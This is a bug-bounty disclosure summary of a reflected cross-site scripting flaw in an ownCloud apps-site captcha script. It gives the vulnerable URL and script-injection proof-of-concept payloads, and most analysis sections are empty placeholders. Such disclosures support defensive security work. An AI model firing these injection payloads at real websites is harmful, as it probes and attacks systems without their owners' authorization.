# Cross site scripting in apps.owncloud.com

## Metadata
- **Source:** HackerOne
- **Report:** 129551 | https://hackerone.com/reports/129551
- **Submitted:** 2016-04-09
- **Reporter:** kalihat007
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary

Vulenrablity Affects : http://apps.owncloud.com/lib/freecaptcha/freecap_wrap.php

POC : 

URI was set to :  "><script>alert(1)</script>

url : http://apps.owncloud.com/lib/freecaptcha/freecap_wrap.php/"><script>prompt(1)</script>

Screenshot : enclosed 



## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>


Vulenrablity Affects : http://apps.owncloud.com/lib/freecaptcha/freecap_wrap.php

POC : 

URI was set to :  "><script>alert(1)</script>

url : http://apps.owncloud.com/lib/freecaptcha/freecap_wrap.php/"><script>prompt(1)</script>

Screenshot : enclosed 



</details>

---
*Analysed by Claude on 2026-05-24*
